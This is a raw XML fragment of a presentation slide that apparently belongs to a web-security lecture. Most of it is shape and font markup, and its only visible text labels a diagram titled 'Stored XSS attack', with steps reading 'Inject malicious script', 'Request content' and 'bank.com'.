            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164887" name="object 30"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="282949" cy="267540"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId8"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164888" name="object 31"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8135471" y="5436254"/>
            <a:ext cx="284350" cy="267540"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 415290"/>
              <a:gd name="T1" fmla="*/ 0 h 379729"/>
              <a:gd name="T2" fmla="*/ 944 w 415290"/>
              <a:gd name="T3" fmla="*/ 0 h 379729"/>
              <a:gd name="T4" fmla="*/ 944 w 415290"/>
              <a:gd name="T5" fmla="*/ 1713 h 379729"/>
              <a:gd name="T6" fmla="*/ 0 w 415290"/>
              <a:gd name="T7" fmla="*/ 1713 h 379729"/>
              <a:gd name="T8" fmla="*/ 0 w 415290"/>
              <a:gd name="T9" fmla="*/ 0 h 3797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15290" h="379729">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="415086" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415086" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="379399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="object 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4989420" y="3863264"/>
            <a:ext cx="2512919" cy="243656"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1877"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2030" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Request</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2030" spc="-56" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3000" spc="21" baseline="-1915" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>content</a:t>
            </a:r>
            <a:endParaRPr sz="3000" baseline="-1915" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164890" name="object 22"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4616824" y="3227294"/>
            <a:ext cx="322169" cy="331975"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 989 w 471170"/>
              <a:gd name="T1" fmla="*/ 622 h 471170"/>
              <a:gd name="T2" fmla="*/ 1023 w 471170"/>
              <a:gd name="T3" fmla="*/ 826 h 471170"/>
              <a:gd name="T4" fmla="*/ 1035 w 471170"/>
              <a:gd name="T5" fmla="*/ 1033 h 471170"/>
              <a:gd name="T6" fmla="*/ 1028 w 471170"/>
              <a:gd name="T7" fmla="*/ 1239 h 471170"/>
              <a:gd name="T8" fmla="*/ 1003 w 471170"/>
              <a:gd name="T9" fmla="*/ 1435 h 471170"/>
              <a:gd name="T10" fmla="*/ 959 w 471170"/>
              <a:gd name="T11" fmla="*/ 1619 h 471170"/>
              <a:gd name="T12" fmla="*/ 899 w 471170"/>
              <a:gd name="T13" fmla="*/ 1783 h 471170"/>
              <a:gd name="T14" fmla="*/ 823 w 471170"/>
              <a:gd name="T15" fmla="*/ 1922 h 471170"/>
              <a:gd name="T16" fmla="*/ 733 w 471170"/>
              <a:gd name="T17" fmla="*/ 2031 h 471170"/>
              <a:gd name="T18" fmla="*/ 634 w 471170"/>
              <a:gd name="T19" fmla="*/ 2100 h 471170"/>
              <a:gd name="T20" fmla="*/ 532 w 471170"/>
              <a:gd name="T21" fmla="*/ 2126 h 471170"/>
              <a:gd name="T22" fmla="*/ 433 w 471170"/>
              <a:gd name="T23" fmla="*/ 2112 h 471170"/>
              <a:gd name="T24" fmla="*/ 337 w 471170"/>
              <a:gd name="T25" fmla="*/ 2059 h 471170"/>
              <a:gd name="T26" fmla="*/ 246 w 471170"/>
              <a:gd name="T27" fmla="*/ 1970 h 471170"/>
              <a:gd name="T28" fmla="*/ 167 w 471170"/>
              <a:gd name="T29" fmla="*/ 1846 h 471170"/>
              <a:gd name="T30" fmla="*/ 100 w 471170"/>
              <a:gd name="T31" fmla="*/ 1690 h 471170"/>
              <a:gd name="T32" fmla="*/ 46 w 471170"/>
              <a:gd name="T33" fmla="*/ 1505 h 471170"/>
              <a:gd name="T34" fmla="*/ 13 w 471170"/>
              <a:gd name="T35" fmla="*/ 1300 h 471170"/>
              <a:gd name="T36" fmla="*/ 0 w 471170"/>
              <a:gd name="T37" fmla="*/ 1093 h 471170"/>
              <a:gd name="T38" fmla="*/ 7 w 471170"/>
              <a:gd name="T39" fmla="*/ 888 h 471170"/>
              <a:gd name="T40" fmla="*/ 33 w 471170"/>
              <a:gd name="T41" fmla="*/ 692 h 471170"/>
              <a:gd name="T42" fmla="*/ 76 w 471170"/>
              <a:gd name="T43" fmla="*/ 508 h 471170"/>
              <a:gd name="T44" fmla="*/ 136 w 471170"/>
              <a:gd name="T45" fmla="*/ 343 h 471170"/>
              <a:gd name="T46" fmla="*/ 212 w 471170"/>
              <a:gd name="T47" fmla="*/ 204 h 471170"/>
              <a:gd name="T48" fmla="*/ 303 w 471170"/>
              <a:gd name="T49" fmla="*/ 96 h 471170"/>
              <a:gd name="T50" fmla="*/ 402 w 471170"/>
              <a:gd name="T51" fmla="*/ 27 h 471170"/>
              <a:gd name="T52" fmla="*/ 503 w 471170"/>
              <a:gd name="T53" fmla="*/ 0 h 471170"/>
              <a:gd name="T54" fmla="*/ 603 w 471170"/>
              <a:gd name="T55" fmla="*/ 14 h 471170"/>
              <a:gd name="T56" fmla="*/ 699 w 471170"/>
              <a:gd name="T57" fmla="*/ 67 h 471170"/>
              <a:gd name="T58" fmla="*/ 788 w 471170"/>
              <a:gd name="T59" fmla="*/ 157 h 471170"/>
              <a:gd name="T60" fmla="*/ 869 w 471170"/>
              <a:gd name="T61" fmla="*/ 279 h 471170"/>
              <a:gd name="T62" fmla="*/ 935 w 471170"/>
              <a:gd name="T63" fmla="*/ 436 h 471170"/>
              <a:gd name="T64" fmla="*/ 989 w 471170"/>
              <a:gd name="T65" fmla="*/ 622 h 47117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71170" h="471170">
                <a:moveTo>
                  <a:pt x="449552" y="137685"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="464888" y="182834"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="470745" y="228730"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="467591" y="274118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="455895" y="317745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="436126" y="358355"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="408751" y="394696"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374239" y="425513"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333059" y="449552"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="287910" y="464888"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242014" y="470745"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="196626" y="467591"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152999" y="455895"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112389" y="436126"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76048" y="408751"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45231" y="374239"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21192" y="333059"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5856" y="287910"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="242014"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3153" y="196626"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14849" y="152999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34619" y="112389"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61993" y="76048"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96505" y="45231"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137685" y="21193"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="182834" y="5856"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="228730" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="274118" y="3153"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="317745" y="14849"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="358355" y="34619"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394696" y="61993"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="425513" y="96505"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="449552" y="137685"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="25399">
            <a:solidFill>
              <a:srgbClr val="0365C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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="object 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1200000">
            <a:off x="4685460" y="3290521"/>
            <a:ext cx="358588" cy="307777"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2409"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr sz="2471" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="35" name="Straight Arrow Connector 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4088747" y="3281924"/>
            <a:ext cx="3332349" cy="1368518"/>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37" name="Straight Arrow Connector 36"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="4155982" y="3908051"/>
            <a:ext cx="3311338" cy="1368519"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="164894" name="Picture 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830761" y="4370295"/>
            <a:ext cx="1927412" cy="178033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3" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164896" name="object 18"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8072439" y="2910729"/>
            <a:ext cx="1318091" cy="12850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58738">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2846"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2471">
                <a:solidFill>
                  <a:srgbClr val="1333FF"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2262"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inject</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2030" b="1">
                <a:solidFill>
                  <a:srgbClr val="06BC00"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>malicious  script</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2030">
              <a:solidFill>
                <a:prstClr val="black"/>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420899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295931" y="71438"/>
            <a:ext cx="5593136" cy="678968"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr spc="-21" dirty="0"/>
              <a:t>Stored </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-311" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr spc="-11" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr spc="49" dirty="0"/>
              <a:t>attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165891" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2794468" y="2996174"/>
            <a:ext cx="1294279" cy="1392331"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
